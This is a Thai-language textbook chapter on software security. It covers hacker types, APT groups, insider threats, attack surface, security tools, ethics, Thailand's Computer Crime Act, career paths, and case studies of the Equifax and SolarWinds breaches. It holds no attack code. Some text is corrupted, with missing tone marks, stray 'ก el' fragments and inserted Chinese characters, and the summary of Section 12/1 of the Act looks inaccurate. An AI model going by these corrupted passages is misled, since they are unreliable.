แฮกเกอร (Hacker) ถูกแบงออกเป็นประเภทตามเจตนาและความชอบดวยกฎหมาย

**Black Hat Hacker (แฮกเกอรหมวกดํา)**
ผูโจมตีที่บุกรกระบบโดยไมไดรับอนุญาตเพื่อผลประโยชนส่วนตัว ไมวาจะเป็นทางการเงิน การเมือง หรือการกอความเสียหาย
- การกระทําผิดกฎหมายอาญา
- ตัวอยาง: Kevin Mitnick (ในอดีต), กลุม ransomware อยาง LockBit, Clop
- มักใชช่องโหว่ในซอฟต์แวร์เพื่อเจาะระบบ ขโมยข้อมูล หรือเรียกคาไถ

**White Hat Hacker (แฮกเกอรหมวกขาว)**
ผูเชี่ยวชาญด้านความปลอดภัยที่ไดรับอนุญาตใหทดสอบระบบโดยถูกต้องตามกฎหมายและจริยธรรม
- ทํางานภายใตขอตกลงเป็นลายลักษณอักษร (Rules of Engagement)
- รายงานช่องโหว่ที่พบเพื่อใหองคกรแกไข
- ตัวอยาง: ผูเชี่ยวชาญด้าน Penetration Testing, Bug Bounty Hunter

**Grey Hat Hacker (แฮกเกอรหมวกเทา)**
อยูตรงกลางระหวางหมวกดําและหมวกขาว อาจเจาะระบบโดยไมไดรับอนุญาตแตไมไดมีเจตนาราย ปกติต้องการเปดโพลงช่องโหว่เพื่อใหผูผลิตแกไข
- การกระทําอาจผิดกฎหมาย แมจะมีเจตนาดี
- ตัวอยาง: กรณีที่นักวิจัยคนพบช่องโหว่และเปดโพลงโดยไมแจ้งผู้ผลิตกอน (Full Disclosure โดยไมผาน Coordinated Disclosure)

---

#### 1.5.2 Script Kiddie

Script Kiddie (หรือ Skiddie) คือผูที่ใชเครื่องมือและสคริปตสําเร็จรูปที่มีอยูแลวในการโจมตี โดยไมมีความเขาใจอยางลึกซึ้งเกี่ยวกับวิธีการทํางานของเครื่องมือนั้น

**ลักษณะสำคัญ:**
- อาศัยเครื่องมือสําเร็จรูปจากอินเทอรเน็ต เช่น Metasploit (ใชโดยไมเขาใจ), SQLMap, สคริปต exploitation ต่างๆ
- มักโจมตีแบบ "สุุม" (Spray and Pray) โดยหวังวาจะเจอระบบที่ไมไดอัปเดต
- มีทักษะทางเทคนิคจํากัด แตสามารถกอใหเกิดความเสียหายไดมากเนื่องจากเครื่องมือที่มีประสิทธิภาพหาไดงาย
- แรงจูงใจมักเป็นการสรางชื่อเสียงในกลุมเพื่อน หรือความสนุกส่วนตัว ไมใชผลประโยชนทางการเงินที่ซับซอน

**อันตรายของ Script Kiddie:** แมจะมีทักษะต่ํา แตเครื่องมือสมัยใหมมีประสิทธิภาพสูง ทําให Script Kiddie สามารถโจมตีระบบที่ไมไดป้องกันดีไดสําเร็จ

---

#### 1.5.3 APT (Advanced Persistent Threat)

APT คือกลุมผูโจมตีที่มีความสามารถสูง มักไดรับการสนับสนุนจากรัฐ หรือเป็นองคกรอาชญากรรมทางไซเบอรที่มีการจัดการดีเยี่ยม โดยมีเปาหมายเฉพาะเจาะจงและตอเนื่องยาวนาน

**ลักษณะสำคัญของ APT:**
- **Advanced (ขั้นสูง):** ใชเทคนิคการโจมตีที่ซับซอน รวมถึงการพัฒนาเครื่องมือเฉพาะสำหรับเปาหมาย
- **Persistent (ตอเนื่อง):** ติดตามเปาหมายเป็นเวลานาน เดือนหรือป โดยไมยอมแพงาย
- **Threat (เป็นภัยคุกคาม):** มีทรัพยากรและกําลังคนจํานวนมาก

**ตัวอยางกลุม APT ที่มีชื่อเสียง:**
- **APT29 (Cozy Bear):** เชื่อวาเป็นหนวยขาวกรองของรัสเซีย (SVR) เคยก el โจมตี SolarWinds, Democratic National Committee
- **APT41 (Winnti):** กลุมจากจีน ที่มุงเปาหมายอุตสาหกรรมเกม เทคโนโลยี และเภสัชกรรม
- **Lazarus Group:** กลุมจากเกาหลีเหนือ เชื่อมโยงกับการโจมตีธนาคารกลางบังกลาเทศและ Sony Pictures
- **APT28 (Fancy Bear):** เชื่อวาเป็นหนวยขาวกรองทหารของรัสเซีย (GRU) เคยก el โจมตี World Anti-Doping Agency

**วิธีการทํางานของ APT:**
1. **Reconnaissance:** สํารวจเปาหมายอยางละเอียด รวมถึงการศึกษาพนักงาน โครงสรางพื้นฐาน เทคโนโลยีที่ใช
2. **Initial Compromise:** ใชเทคนิคต่างๆ เช่น Spear Phishing, Zero-day Exploit, Supply Chain Attack
3. **Establish Foothold:** ติดตั้ง backdoor เพื่อเขาถึงระบบไดตอเนื่อง
4. **Lateral Movement:** ยายภายในเครือขายเพื่อเขาใกลเปาหมายที่แทจริง
5. **Data Exfiltration:** ขโมยข้อมูลเปาหมาย โดยมักทําชาๆ เพื่อไมใหถูกตรวจพบ

**APT แตกต่างจากอาชญากรทั่วไปอยางไร:**
- มีงบประมาณและทรัพยากรสูงมาก
- ใช Zero-day เป็นอาวุธหลัก (อาชญากรทั่วไปใช Known Vulnerability)
- มีเปาหมายเฉพาะไมใชการโจมตีแบบสุ่ม
- ติดตามเปาหมายยาวนานและอดทนสูง

---

#### 1.5.4 Insider Threat (ภัยคุกคามจากภายใน)

Insider Threat คือภัยคุกคามที่เกิดจากบุคคลภายในองคกร เช่น พนักงาน อดีตพนักงาน ผูรับเหมา หรือคูคาทรัสต

**ประเภทของ Insider Threat:**

**1. Malicious Insider (เจตนาราย)**
- พนักงานที่ไมพอใจตอองคกร (Disgruntled Employee)
- พนักงานที่รับสินบนจากคูแขงหรืออาชญากร
- อดีตพนักงานที่ยังมีสิทธิ์เขาถึงระบบ
- ตัวอยาง: พนักงาน IT ของบริษัทการเงินที่ขายข้อมูลลูกคาใหแกองคกรอาชญากรรม

**2. Accidental Insider (ไมไดตั้งใจ)**
- พนักงานที่คลิกลิงก Phishing โดยไมรูตัว
- พนักงานที่สงข้อมูลไปยังที่ผิด
- พนักงานที่ตั้งคาระบบผิดพลาดโดยไมตั้งใจ
- ตัวอยาง: พนักงานที่สงไฟล Excel ที่มีข้อมูลลูกคาไปยังอีเมลผิดคน

**3. Compromised Insider (ถูกประนีประนอม)**
- บัญชีพนักงานที่ถูกโจมตี Credential Theft
- อุปกรณของพนักงานที่ถูกมัลแวรควบคุม
- ตัวอยาง: CEO ไดรับ Spear Phishing ที่ทําใหผูโจมตีเขาถึงระบบได

**สถิติ Insider Threat:**
จากรายงาน Ponemon Institute พบวา
- 63% ของ Insider Threat เกิดจากความประมาท (Negligence)
- 23% เกิดจากเจตนาราย (Malicious)
- 14% เกิดจากการถูกขโมยข้อมูลประจําตัว (Credential Theft)
- ตนทุนเฉลี่ยตอเหตุการณ Insider Threat อยูที่ประมาณ 16.2 ลานเหรียญสหรัฐ (ข้อมูลป 2023)

**การป้องกัน Insider Threat:**
- ใชหลัก Least Privilege: ใหสิทธิ์เทาที่จําเป็นตอการทํางาน
- มีระบบตรวจสอบพฤติกรรมผูใช (User Behavior Analytics - UBA)
- จัดอบรมด้านความปลอดภัยใหพนักงานอยางตอเนื่อง
- มีกระบวนการ Onboarding และ Offboarding ที่รัดกุม
- ดําเนินการสอบสวนเมื่อมีพฤติกรรมที่นาสงสัย

**คําถามสำหรับการอภิปรายในชั้นเรียน:** ทานคิดวาองคกรควรมีมาตรการตรวจสอบพนักงาน (Surveillance) มากนอยแคไหนโดยไมละเมิดสิทธิส่วนบุคคล

---

### 1.6 Attack Surface (พื้นผิวการถูกโจมตี)

Attack Surface คือ พื้นที่หรือชองทางทั้งหมดที่ผูโจมตีสามารถใชในการเขาโจมตีระบบซอฟต์แวร์ ซึ่งรวมถึงทุกส่วนของระบบที่ผูใชหรือระบบภายนอกสามารถเขาได

**องคประกอบของ Attack Surface:**

**1. Network Attack Surface**
- พอร์ตที่เปด (Open Ports): SSH (22), HTTP (80), HTTPS (443), ฐานข้อมูล (3306, 5432)
- API Endpoints ที่เปดสูสาธารณะ
- บริการเครือขายที่ทํางานอยู
- ระบบที่เชื่อมตออินเทอรเน็ตโดยตรง

**2. Software Attack Surface**
- Input Points: ทุกชองทางที่ซอฟต์แวร์รับข้อมูลจากภายนอก เช่น Form Input, API Parameters, File Upload, HTTP Headers
- Third-party Components: โลบราลี, SDK, API ภายนอก
- Error Messages: ขอความผิดพลาดที่อาจรั่วไหลข้อมูลภายใน
- Configuration Files: ไฟลตั้งคาที่มีข้อมูลออนไหว

**3. Human Attack Surface**
- พนักงานที่ตกเป็นเปา Social Engineering
- ผูดูแลระบบที่ดูและระบบสำคัญ
- ผูใชปลายทางที่อาจถูกหลอกใหติดตั้งซอฟต์แวร์อันตราย

**4. Physical Attack Surface**
- อุปกรณที่สามารถเขาถึงไดทางกายภาพ (เซิรฟเวอร, แล็ปท็อป)
- USB port, Console port
- เอกสารและสื่อบันทึกข้อมูล

**การลด Attack Surface (Attack Surface Reduction):**
- ปดบริการและพอร์ตที่ไมจําเป็น
- ใช Network Segmentation เพื่อจํากัดการเขาถึง
- ใช Firewall และ Access Control List (ACL)
- จํากัด Input Points: รับข้อมูลเฉพาะที่จําเป็นเทานั้น
- ใช API Gateway ในการกรองและควบคุม API
- ไมติดตั้งซอฟต์แวร์ที่ไมจําเป็น
- แกไขข้อมูลใน Error Messages ไมใหรั่วไหลข้อมูลภายใน

**ตัวอยาง Attack Surface ที่เพิ่มขึ้นจากเทคโนโลยีใหม:**
- **Cloud Computing:** API management console, storage bucket, IAM configuration
- **IoT:** อุปกรณจํานวนมากที่มักออนแอด้านความปลอดภัย
- **Microservices:** จํานวนบริการที่มากขึ้นหมายถึง Attack Surface ที่มากขึ้น
- **Mobile Apps:** หลาย platform (iOS, Android), ส่วนติดตอกับระบบหลังบาน

**ขอควรจํา:**
- ยิ่งหนาที่ซอฟต์แวร์มากเทาไหร Attack Surface ยิ่งใหญตาม
- Attack Surface มีแนวโนมเพิ่มขึ้นตามความซับซอนของระบบ
- การลด Attack Surface เป็นวิธีที่มีประสิทธิภาพในการป้องกันการโจมตี

### 1.7 ทักษะและเครื่องมือพื้นฐานที่จําเป็นสำหรับ Software Security

นักศึกษาทที่ต้องการทํางานด้านความมั่นคงปลอดภัยของซอฟต์แวร์ควรมีทักษะพื้นฐานดังนี้

**1. ความรู้ด้านการเขียนโปรแกรม (Programming)**
- เขาใจหลักการพัฒนาซอฟต์แวร์
- รูจักภาษาที่ใชบอย เช่น Python, JavaScript, Java, C#, Go
- เขาใจแนวคิดเรื่อง Input Validation, Type Safety, Memory Management
- สามารถอานและวิเคราะหโค้ดเพื่อหาจุดออนได

**2. ความรู้ด้านระบบปฏิบัติการ (Operating Systems)**
- พื้นฐาน Linux: Command Line, Permissions, Process Management, Networking
- พื้นฐาน Windows: Active Directory, Group Policy, Registry, Services
- ความรูเรื่อง File System และการจัดการสิทธิ์

**3. ความรู้ด้านเครือขาย (Networking)**
- OSI Model และ TCP/IP Protocol Stack
- โปรโตคอลสำคัญ: HTTP/HTTPS, DNS, TLS, SSH, FTP
- การใชเครื่องมือเช่น Wireshark, tcpdump, nmap
- เขาใจหลักการ Firewall, NAT, Proxy, VPN

**4. ความรู้ด้าน Web Technologies**
- HTTP Methods, Headers, Cookies, Session
- HTML, JavaScript, DOM, AJAX
- REST API, GraphQL
- CORS, Same-Origin Policy

**5. เครื่องมือพื้นฐานด้านความปลอดภัย**

| หมวดหมู | เครื่องมือ | การใชงาน |
|---------|-----------|----------|
| SAST | SonarQube, Semgrep, CodeQL | วิเคราะหโค้ดตนฉบับหาช่องโหว่ |
| DAST | OWASP ZAP, Burp Suite | ทดสอบแอปพลิเคชันขณะทํางาน |
| SCA | Trivy, Snyk, OWASP Dependency-Check | สแกน Third-party Dependencies |
| Network | Nmap, Wireshark, Netcat | สํารวจและวิเคราะหเครือขาย |
| Exploitation | Metasploit, SQLMap, Hydra | ทดสอบการเจาะระบบ |
| Cryptography | OpenSSL, GPG, Hashcat | จัดการและทดสอบการเขารหัส |
| Cloud | ScoutSuite, Prowler, Pacu | ตรวจสอบความปลอดภัยของ Cloud |
| OSINT | Shodan, Recon-ng, theHarvester | คนหาข้อมูลเปาหมายจากเปด |

**6. ทักษะการคิดเชิงวิเคราะหวจารณ (Critical Thinking)**
- สามารถวิเคราะหระบบเพื่อหาจุดออน
- เขาใจ Causality: อะไรทําใหเกิดช่องโหว่
- สามารถสราง Threat Model และออกแบบการป้องกัน

**7. Soft Skills ที่จําเป็น**
- การสื่อสาร: อธิบายความเสี่ยงและแนวทางป้องกันใหผูไมใชสายเทคนิคเขาใจ
- การเขียนรายงาน: บันทึกผลการทดสอบและการคนพบอยางเป็นระบบ
- การทํางานเป็นทีม: ทํางานรวมกับนักพัฒนา วิศวกรระบบ และฝ่ายบริหาร
- จริยธรรม: ตระหนักถึงผลกระทบของการทํางานด้านความปลอดภัยตอผูอื่น

### 1.8 จริยธรรมและกฎหมายที่เกี่ยวของ

#### 1.8.1 จริยธรรมสำหรับนักด้านความปลอดภัยของซอฟต์แวร์

ผูเชี่ยวชาญด้านความมั่นคงปลอดภัยของซอฟต์แวร์ต้องยึดมั่นในจริยธรรมที่สำคัญ

**หลักจริยธรรมพื้นฐาน:**
1. **ไดรับอนุญาตกอนทดสอบ**: ต้องไดรับอนุญาตเป็นลายลักษณอักษรกอนทําการทดสอบเจาะระบบในระบบใดๆ
2. **รายงานช่องโหว่อยางรับผิดชอบ (Responsible Disclosure)**: แจ้งผู้พัฒนา/เจาของระบบกอนเปดโพลงตอสาธารณะ โดยปกติใหเวลา 90-120 วัน
3. **ไมสรางความเสียหายเกินจําเป็น**: ในการทดสอบต้องระมัดระวังไมใหระบบเสียหาย
4. **รักษาความลับ**: ข้อมูลที่พบระหวางการทดสอบต้องถูกเก็บเป็นความลับ
5. **ไมนําวิชาความรูไปใชในทางที่ผิด**: ความรูที่ไดเรียนรูต้องใชเพื่อประโยชนในการป้องกันเทานั้น

#### 1.8.2 พระราชบัญญัติวาดวยการกระทําความผิดเกี่ยวกับคอมพิวเตอร พ.ศ. 2550 และที่แกไขเพิ่มเติม (ฉบับที่ 2) พ.ศ. 2560

พรบ. คอมพิวเตอรเป็นกฎหมายหลักของไทยที่ใชบังคับกับการกระทําความผิดที่เกี่ยวของกับคอมพิวเตอรและระบบคอมพิวเตอร

**สาระสำคัญที่นักศึกษาต้องรู:**

**มาตรา 5:** การเขาถึงระบบคอมพิวเตอรของผูอื่นโดยมิชอบ
- ผูใดเขาถึงระบบคอมพิวเตอรที่มีมาตรการป้องกันการเขาถึงโดยเฉพาะ โดยมิชอบ
- โทษ: จําคุกไมเกิน 6 เดือน หรือปรับไมเกิน 1 หมื่นบาท หรือทั้งจําทั้งปรับ

**มาตรา 6:** การเปดเผยมาตรการป้องกัน
- ผูใดลวงรูมาตรการป้องกันและนําไปเปดเผยโดยนาจะทําใหเกิดความเสียหาย
- โทษ: จําคุกไมเกิน 1 ป หรือปรับไมเกิน 2 หมื่นบาท หรือทั้งจําทั้งปรับ

**มาตรา 7:** การเขาถึงข้อมูลคอมพิวเตอรโดยมิชอบ
- ผูใดเขาถึงข้อมูลคอมพิวเตอรโดยมิชอบ
- โทษ: จําคุกไมเกิน 2 ป หรือปรับไมเกิน 4 หมื่นบาท หรือทั้งจําทั้งปรับ

**มาตรา 8:** การดักรับข้อมูลคอมพิวเตอร
- ผูใดดักรับข้อมูลคอมพิวเตอรของผูอื่นโดยมิชอบ
- โทษ: จําคุกไมเกิน 3 ป หรือปรับไมเกิน 6 หมื่นบาท หรือทั้งจําทั้งปรับ

**มาตรา 9:** การทําใหเสียหาย ทําลาย แกไข เปลียนแปลง ข้อมูลคอมพิวเตอร
- โทษ: จําคุกไมเกิน 5 ป หรือปรับไมเกิน 1 แสนบาท หรือทั้งจําทั้งปรับ

**มาตรา 10:** การกอใหเกิดการขัดหยองของระบบคอมพิวเตอร
- การสงข้อมูลที่ทําใหระบบคอมพิวเตอรทํางานผิดพลาด (เช่น DDoS)
- โทษ: จําคุกไมเกิน 5 ป หรือปรับไมเกิน 1 แสนบาท หรือทั้งจําทั้งปรับ

**มาตรา 11:** การสงข้อมูลคอมพิวเตอรที่เป็นเท็จหรือกอใหเกิดความเดือดรอน
- การนําเขาข้อมูลที่เป็นเท็จสูระบบคอมพิวเตอร
- การสงข้อมูลที่รบกวน (Spam)

**มาตรา 12/1 (เพิ่มเติม พ.ศ. 2560):** การทําใหผูอื่นเสียหายจากการปดเปอนข้อมูล
- ผูใดทําใหผูอื่นเสียชื่อเสียง或被ดูหมิ่น ดวยการนําเขาข้อมูลที่เป็นเท็จหรือตัดตอนภาพ

**มาตรา 14:** ข้อมูลคอมพิวเตอรที่เป็นเท็จและปดโกง
- การนําเขาข้อมูลที่ปดเบือนหรือเท็จเขาสูระบบคอมพิวเต
- การนําเขาข้อมูลที่เป็นความผิดเกี่ยวกับความมั่นคง

**ผลกระทบตอการเรียนและปฏิบัติการ:**
- การฝกปฏิบัติในหองแลบต้องทําในสภาพแวดลอมที่แยกขาดจากระบบจริง
- การทดสอบความปลอดภัยต้องไดรับอนุญาตเป็นลายลักษณอักษรจากผูมีอํานาจเทานั้น
- การใชเครื่องมือเจาะระบบ (Nmap, Metasploit, SQLMap) ตอระบบที่ไมไดรับอนุญาตอาจมีความผิดตามมาตรา 5, 7 และ 8
- แมวาจะมีเจตนาเพื่อการศึกษาก็อาจไมไดรับการยกเวนโทษหากไมไดรับอนุญาต

**ขอควรจํา:**
- การทดสอบเจาะระบบโดยไมไดรับอนุญาตถือวาผิดกฎหมาย ถึงแมจะไมไดมุงรายหรือทําเพื่อการศึกษาก็ตาม
- การคนหาช่องโหว่และรายงานตอสาธารณะโดยไมแจ้งเจ้าของกอน (Full Disclosure แบบไรการประสานงาน) มีความเสี่ยงทางกฎหมาย
- นักศึกษาควรใชเครื่องมือทดสอบความปลอดภัยเฉพาะในสภาพแวดลอมที่ไดรับอนุญาตเทานั้น

### 1.9 เสนทางสายอาชีพด้าน Software Security

สำหรับนักศึกษาที่สนใจประกอบอาชีพด้านความมั่นคงปลอดภัยของซอฟต์แวร์ มีเสนทางสายอาชีพที่นาสนใจดังนี้

**ตําแหนงงานด้านความปลอดภัยของซอฟต์แวร์:**

| ตําแหนง | บทบาทหนาที่ | ทักษะที่ต้องการ |
|---------|------------|----------------|
| Security Software Engineer | เขียนโค้ดและออกแบบระบบโดยคํานึงถึงความปลอดภัย | Programming, Secure Coding, Threat Modeling |
| Application Security Engineer (AppSec) | ทดสอบและวิเคราะหความปลอดภัยของแอปพลิเคชัน | SAST/DAST, Web Security, Code Review |
| Penetration Tester | ทดสอบเจาะระบบเพื่อหาช่องโหว่ | Exploitation, Networking, OS, Scripting |
| Security Architect | ออกแบบสถาปตยกรรมความปลอดภัยของระบบ | Architecture Design, Risk Assessment, Compliance |
| DevSecOps Engineer | บูรณาการความปลอดภัยเขาใน CI/CD Pipeline | CI/CD, Docker, Kubernetes, Automation |
| Secure Code Reviewer | ตรวจสอบโค้ดเพื่อหาช่องโหว่ | Programming, Static Analysis, CWE Knowledge |
| Bug Bounty Hunter | คนหาช่องโหว่และรายงานเพื่อรับรางวัล | Self-directed, Research Skills, Reporting |
| Security Researcher | วิจัยและคนหาช่องโหว่ Zero-day ใหม | Reverse Engineering, Fuzzing, Academic Background |

**ระดับเงินเดือนโดยประมาณ (ในประเทศไทย ป 2568):**
- Junior (0-2 ป): 30,000 - 60,000 บาทตอเดือน
- Mid-level (3-5 ป): 60,000 - 120,000 บาทตอเดือน
- Senior (5+ ป): 120,000 - 200,000+ บาทตอเดือน
- Manager/Director: 150,000 - 300,000+ บาทตอเดือน

**การเตรียมตัวสำหรับสายอาชีพ:**

1. **เรียนรูพื้นฐาน:** พัฒนาซอฟต์แวร์ + เครือขาย + ระบบปฏิบัติการ
2. **ไดรับใบรับรอง:** ปริญญาตรีด้านวิศวกรรมคอมพิวเตอร วิทยาการคอมพิวเตอร หรือสาขาที่เกี่ยวของ
3. **ใบประกาศนียบัตร (Certification) ที่นาสนใจ:**
   - **Certified Secure Software Lifecycle Professional (CSSLP):** จาก ISC2 สำหรับ Software Security โดยเฉพาะ
   - **Offensive Security Certified Professional (OSCP):** สำหรับ Penetration Testing
   - **Certified Information Systems Security Professional (CISSP):** มาตรฐานสำหรับผูบริหารความปลอดภัย
   - **GIAC Web Application Penetration Tester (GWAPT):** สำหรับ Web App Security
   - **GIAC Secure Software Programmer (GSSP-JAVA/.NET):** สำหรับ Secure Coding
4. **ประสบการณฝกปฏิบัติ:**
   - ฝกงานในบริษัทที่มีทีม Security
   - เขารวม Capture The Flag (CTF) Competitions
   - ทํา Bug Bounty ในแพลตฟอรมเช่น HackerOne, Bugcrowd
   - มีผลงาน Open Source หรือ GitHub ที่แสดงถึงความสามารถ

## กรณีศึกษา

### กรณีศึกษา 1: Equifax Data Breach (2017)

**ปที่เกิดเหตุการณ:** พฤษภาคม - กรกฎาคม 2560 (เปดโพลง กันยายน 2560)
**ประเภทการโจมตี:** การโจมตีผานช่องโหว่ซอฟต์แวร์ที่ไมไดอัปเดต
**จํานวนผูไดรับผลกระทบ:** 147 ลานคนทั่วโลก (143 ลานในสหรัฐฯ)
**ความเสียหาย:** รวมกวา 1.4 พันลานเหรียญสหรัฐ

**สาเหตุของเหตุการณ:**
Equifax เป็นบริษัทข้อมูลสินเชื่อที่ใหญที่สุดแหงหนึ่งของสหรัฐอเมริกา เหตุการณเริ่มตนจากช่องโหว่ CVE-2017-5638 ใน Apache Struts 2 ซึ่งเป็นเฟรมเวิรกสำหรับพัฒนาเว็บแอปพลิเคชัน Java ช่องโหว่นี้เป็น Remote Code Execution (RCE) ที่เกิดจาก Jakarta Multipart parser จัดการ exception ไมถูกต้อง ทําใหผูโจมตีสามารถสงคําสั่งไปยังเซิรฟเวอรผานทาง HTTP header ที่สรางขึ้นพิเศษ

Apache ออกแพตชสำหรับช่องโหว่นี้ในวันที่ 6 มีนาคม 2560 แต Equifax ไมไดนําแพตชไปใชในระบบของตน

**ลําดับเหตุการณ:**
1. 13 พฤษภาคม 2560: ผูโจมตีเริ่มใชช่องโหว่ Apache Struts เพื่อเขาถึงระบบ Equifax
2. ผูโจมตีติดตั้ง web shell เพื่อเขาถึงระบบอยางตอเนื่อง
3. ผูโจมตียาย (Lateral Movement) ไปยังฐานข้อมูลที่มีข้อมูลส่วนบุคคล
4. 29 กรกฎาคม 2560: Equifax ตรวจพบกิจกรรมผิดปกติ
5. กันยายน 2560: Equifax แจ้งต่อสาธารณะและยอมรับวาช่องโหว่เกิดจาก Apache Struts ที่ไมไดอัปเดต

**ข้อมูลที่ถูกขโมย:**
- ชื่อ นามสกุล
- เลขประจําตัวประชาชน (Social Security Number)
- วันเดือนปเกิด
- ที่อยู
- หมายเลขใบขับขี่
- หมายเลขบัตรเครดิต 209,000 ใบ
- เอกสารขอยกเวนข้อมูล 182,000 ฉบับ

**ผลกระทบ:**
- Equifax จายคาปรับและคาเสียหายกวา 1.4 พันลานเหรียญสหรัฐ
- CEO Richard Smith ลาออก
- Equifax ต้องจายคาปรับใหกับ Federal Trade Commission (FTC) ถึง 575 ลานเหรียญสหรัฐ
- สูญเสียความเชื่อมั่นจากผูบริโภคและนักลงทุน
- ราคาหุนตกต่ําอยางหนักทันที

**บทเรียนที่ได:**

**1. การบริหารจัดการแพตช (Patch Management) ที่มีประสิทธิภาพเป็นสิ่งสำคัญอยางยิ่**
Equifax ทราบถึงช่องโหว่ลวงหนาแตไมไดอัปเดตระบบอยางทันทวงที การมีกระบวนการ Patch Management ที่รัดกุมสามารถป้องกันเหตุการณนี้ได

**2. การสํารวจสินทรัพยดิจิทัล (Asset Inventory)**
Equifax มีข้อมูลวามีกี่ระบบที่ต้องอัปเดต Apache Struts บาง? การมีระบบ Inventory ที่สมบูรณจะชวยใหไมมีช่องโหว่ที่ถูกมองขาม

**3. การแบงแยกเครือขาย (Network Segmentation)**
ระบบที่ติดตอกับผูใชภายนอกควรแยกออกจากฐานข้อมูลภายใน การที่ผูโจมตีสามารถลามจากเว็บเซิรฟเวอรไปยังฐานข้อมูลไดโดยตรงแสดงวาเครือขายภายในไมไดถูกแบงแยกอยางเหมาะสม

**4. การเฝาระวังและตรวจสอบ (Monitoring and Detection)**
ผูโจมตีอยูในระบบนานถึง 76 วันกอนที่จะถูกตรวจพบ ระบบ SIEM และการเฝาระวังที่ดีนาจะตรวจพบพฤติกรรมผิดปกติไดเร็วกวานี้

**5. Secure Software Development**
การใช Apache Struts โดยไมมีมาตรการป้องกันเพิ่มเติม (เช่น WAF) และไมมีการติดตามช่องโหว่ใน Third-party Components เป็นจุดออนที่ชัดเจนของกระบวนการพัฒนา

**คําถามสำหรับการอภิปรายในชั้นเรียน:** Equifax มีเจาหนาที่ด้านความปลอดภัยและทราบถึงช่องโหว่ แต่ทำไมถึงไมสามารถป้องกันการโจมตีได ทานคิดวาปจจัยใดนาจะเป็นสาเหตุหลัก

### กรณีศึกษา 2: SolarWinds Supply Chain Attack (2020)

**ปที่เกิดเหตุการณ:** ตรวจพบในเดือนธันวาคม 2563 (แตผูโจมตีแทรกซึมตั้งแต่ตุลาคม 2562)
**ประเภทการโจมตี:** การโจมตีโซอุปทาน (Supply Chain Attack)
**ผูไดรับผลกระทบ:** องคกรจํานวน 18,000 แหง รวมถึงหนวยงานรัฐบาลสหรัฐฯ และบริษัทใน Fortune 500

**สาเหตุของเหตุการณ:**
SolarWinds เป็นบริษัทซอฟต์แวร์ที่พัฒนา Orion Platform ซึ่งเป็นระบบจัดการ IT และ Network Monitoring ที่ถูกใชงานโดยองคกรหลายหมื่นแหงทั่วโลก กลุมผูโจมตีที่ถูกติดตามในชื่อ UNC2452 หรือ NOBELIUM (เชื่อวาเป็นหนวยขาวกรองของรัสเซีย - APT29/SVR) สามารถแทรกซึมเขาไปในกระบวนการสรางซอฟต์แวร์ของ SolarWinds

**วิธีการโจมตีโดยละเอียด:**

**ขั้นตอนที่ 1: แทรกโค้ดอันตราย (Trojanization)**
ผูโจมตีแทรกโค้ดอันตรายเขาไปใน SolarWinds.Orion.Core.BusinessLayer.dll ซึ่งเป็นคอมโพเนนตหลักของ Orion Platform โดยเลือกว้างใน method ชื่อ RefreshInternal ที่ถูกเรียกใชเป็นระยะ การเพิ่มโค้ดเกิดขึ้นกอนกระบวนการสราง builds (Build Process) ทําให DLL ที่มีโค้ดอันตรายถูกเซ็นลายเซ็นดิจิทัล (Digital Signature) ที่ถูกต้องของ SolarWinds

**ขั้นตอนที่ 2: การกระจายผานซอฟต์แวร์อัปเดต**
เมื่อ SolarWinds สงอัปเดตซอฟต์แวร์ (Hotfix) ไปยังลูกคา DLL ที่มีมัลแวร (SUNBURST) ก็ถูกสงไปดวย ลูกคาที่ติดตั้งอัปเดตตั้งแต่ป 2562 ถึง 2563 โดยไมรูวากําลังติดตั้งซอฟต์แวร์ที่มี backdoor

**ขั้นตอนที่ 3: การสงสัญญาณและการกําหนดเปาหมาย**
SUNBURST มีระยะ "ซอนตัว" (Dormant Period) สูงสุด 2 สัปดาหกอนที่จะเริ่มสงสัญญาณไปยังเซิรฟเวอร Command and Control (C2) การสงสัญญาณใช Domain Generation Algorithm (DGA) เพื่อสรางที่อยูปลายทางที่มีลักษณะแตกต่างกันไปในแตละองคกรที่มีการติดตั้ง ซึ่งทําใหยากตอการตรวจจับ

**ขั้นตอนที่ 4: การโจมตีตอยอด**
เมื่อเซิรฟเวอร C2 สงคําสั่งกลับมา (ผาน DNS CNAME record) SUNBURST สามารถ
- ถายโอนและรันไฟล
- ติดตั้งซอฟต์แวร์เพิ่มเติม (Cobalt Strike)
- เก็บข้อมูลระบบ
- ปดบริการรักษาความปลอดภัย
- ยายระบบภายในเครือขาย (Lateral Movement)

**ผลกระทบ:**
- องคกรกวา 18,000 แหงไดรับซอฟต์แวร์ที่มี backdoor
- มีอยางนอย 100 องคกรที่ถูกโจมตีตอยอด รวมถึง
  - หนวยงานรัฐบาลสหรัฐฯ: กระทรวงการต่างประเทศ, กระทรวงพลังงาน, กระทรวงการคลัง
  - บริษัทเทคโนโลยี: Microsoft, FireEye (ตรวจพบโดย FireEye เอง)
  - หนวยงานด้านความมั่นคง: Homeland Security
- ตนทุนรวมของ SolarWinds ในการแกไข: กวา 3.5 พันลานเหรียญสหรัฐ
- มูลคาหุนของ SolarWinds ลดลงอยางหนัก
- CEO และ CFO ของ SolarWinds ต้องลาออก

**บทเรียนที่ได:**

**1. ความปลอดภัยของกระบวนการสรางซอฟต์แวร์ (Build Pipeline Security)**
ต้องป้องกัน Supply Chain ตั้งแต่การแกไขข้อมูลใน Source Code การ Build ไปจนถึงการ Distribution ใชการตรวจสอบความถูกต้องดวย Checksum และ Signing

**2. หลักการ "Trust No One" และ Zero Trust**
แมวา DLL จะมีลายเซ็นดิจิทัลที่ถูกต้องของ SolarWinds ก็ไมไดหมายความวาปลอดภัย ระบบรักษาความปลอดภัยต้องตรวจสอบพฤติกรรม ไมใชแคตัวตน

**3. ความต้องการ Software Bill of Materials (SBOM)**
หากองคกรมี SBOM ที่สมบูรณ จะสามารถระบุไดอยางรวดเร็ววาระบบใดบางที่ใช SolarWinds Orion และต้องตรวจสอบ

**4. การแบงแยกเครือขายและ Least Privilege**
SUNBURST ทํางานในบริบทของ SolarWinds ซึ่งมักไดรับสิทธิ์สงในระบบเครือขาย หลัก Least Privilege จะชวยจํากัดความเสียหายได

**5. การเฝาระวังที่เนนพฤติกรรม (Behavioral Monitoring)**
SUNBURST ออกแบบมาเพื่อหลบเลี่ยงการตรวจจับแบบ Signature-based การตรวจสอบพฤติกรรมที่ผิดปกติ (Anomalous Behavior) จึงมีความสำคัญ

**คําถามสำหรับการอภิปรายในชั้นเรียน:** ในฐานะบริษัทซอฟต์แวร์ที่อาจถูกโจมตีผาน Supply Chain ทานจะออกแบบกระบวนการตรวจสอบความปลอดภัยใน Build Pipeline อยางไร

